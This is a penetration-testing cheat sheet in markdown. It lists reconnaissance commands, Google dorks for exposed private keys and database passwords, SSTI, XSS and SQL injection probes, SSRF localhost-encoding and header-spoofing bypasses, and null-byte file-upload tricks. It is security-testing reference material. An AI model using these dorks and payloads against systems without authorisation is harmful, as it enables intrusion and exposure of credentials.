# External Penetration Testing

## `Tools`

```text
amass
nmap
gobuster
nikto
Nessus
Burp Suite
```

## `Passive discovery` 

### get js script

```text
go get github.com/tomnomnom/waybackurls
waybackurls internet.org | grep "\.js" | uniq | sort
```

### dork on domain

```text
inurl:example.com intitle:"index of"
inurl:example.com intitle:"index of /" "*key.pem"
inurl:example.com ext:log
inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
```

### get url in file

```text
cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
in js file => curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```

## `Active discovery` 

### Services

```text
nmap -sS -sV -O --top-ports 1000 --script=banner,nse,http-head
```

### Subdomains

#### amass

```text
amass enum -ip -brute -active -d <domain> 
amass viz -maltego -d <domain> -o mydir
```

#### check if subdomain exist

```text
cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
```

### Vhosts

```text
nmap --script http-vhosts -p 80,8080,443 <target>
Burp Intruder (Host header)
```

### Urls

```text
./dirsearch.py -u <target> -e php,html,js,xml -x 500,403
wfuzz -c -z file,/root/wordlist.txt --hc 404 <target>/FUZZ
Burp Pro (Content Discovery)
```

#### Found asset and params

```text
assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
```

#### link finder

```text
https://github.com/GerbenJavado/LinkFinder
 python linkfinder.py -i https://example.com -d -o cli
```

#### `URL finder`

```text
wget -qO- https://stackoverflow.com/ | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u
```

#### Dir Listing dump

```text
wget -r --no-parent target.com/dir
```

## Injections

### SSTI

```text
"<%= 7 * 7 %>"@example.com 
test+(${{7*7}})@example.com
```

### XSS

```text
test+(<script>alert(0)</script>)@example.com
test@example(<script>alert(0)</script>).com
"<script>alert(0)</script>"@example.com
```

### SQLI

For [http://site.com/?q=HERE](http://site.com/?q=HERE)

```text
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'   <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
```

## Bypass __WAF

### SSRF localhost

```text
http://127.1/
http://0000::1:80/
http://[::]:80/
http://2130706433/
http://whitelisted@127.0.0.1
http://0x7f000001/
http://017700000001
http://0177.00.00.01
```

### X-Header

```text
Accept: application/json, text/javascript, */*; q=0.01 
Host : localhost
X-Originating-IP: IP
X-Forwarded-For: IP
X-Remote-IP: IP
X-Remote-Addr: IP
X-Client-IP: IP
X-Host: IP
X-Forwared-Host: IP
```

### NullByte

```text
file.jpg%00shell.php
shell.php%00file.jpg
shell.php%00.jpg
```

## `Burp tips`

### Extensions

RetireJS Burp extension =&gt; donne les versions + les vulns

### `Problems`

#### `SSL Pass Trough`

Burp Suite &gt; Proxy &gt; Options &gt; TLS Pass Through settings: ._.google.com ._.gstatic.com ._.googleapis.com ._.pki.goog ._.mozilla.._

